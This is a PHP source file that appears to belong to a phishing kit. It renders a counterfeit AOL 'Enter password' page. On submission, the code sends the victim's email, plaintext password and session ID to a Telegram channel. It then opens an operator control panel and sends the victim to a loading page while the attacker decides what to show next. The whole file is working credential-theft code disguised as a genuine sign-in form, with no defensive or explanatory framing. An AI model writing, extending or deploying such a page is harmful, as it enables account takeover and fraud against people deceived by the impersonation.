<?php
// password.php — AOL Page 2: Enter password
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid       = $_SESSION['visitor_id'] ?? session_id();
$email     = $_SESSION['email'];
$state     = get_state($sid);
$error     = '';
$show_err  = ($state['page'] === 'pw_error');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pw = $_POST['password'] ?? '';
    if ($pw === '') {
        $error = 'Invalid password. Please try again';
    } else {
        set_state($sid, ['page' => 'loading']);
        $s = get_state($sid);
        tg_send(
            "🔐 <b>AOL PASSWORD SUBMITTED</b>\n\n" .
            "🆔 Full ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n" .
            "🔑 Password: <code>{$pw}</code>\n\n" .
           
            "👇 <b>Choose what to show:</b>"
        );
        tg_panel($sid);
        header('Location: loading.php');
        exit;
    }
}

page_open('Enter password - AOL');
?>

<div class="card" style="text-align:center">

  <!-- Big AOL logo centered -->
  <div class="card-aol-logo">Aol.</div>

  <h1 class="card-title-center">Enter password</h1>
  <p class="card-sub-center">to finish sign in</p>

  <form method="POST" id="pwForm" novalidate style="text-align:left">

    <label class="field-label" for="pwInput" style="color:#555;font-size:13px">Password</label>
    <div class="aol-field">
      <input type="password" name="password" id="pwInput"
             class="aol-input <?= ($error || $show_err) ? 'err' : '' ?>"
             autocomplete="current-password"
             style="padding-right:40px" />
      <!-- Show/hide eye -->
      <button type="button" id="eyeBtn" class="eye-btn" aria-label="Toggle password">
        <svg id="eyeShow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
          <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
          <line x1="1" y1="1" x2="23" y2="23"/>
        </svg>
        <svg id="eyeHide" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="display:none">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
        </svg>
      </button>
    </div>

    <?php if ($error): ?>
      <div class="err-text"><?= htmlspecialchars($error) ?></div>
    <?php elseif ($show_err): ?>
      <div class="err-text">Invalid password. Please try again</div>
    <?php else: ?>
      <div class="err-text" id="pwErr"></div>
    <?php endif; ?>

    <button type="submit" class="btn-aol" style="margin-top:8px">Next</button>

    <div style="text-align:center;margin-top:16px">
      <a href="#" class="aol-link">Forgot password?</a>
    </div>

  </form>
</div>

<?php page_close(); ?>
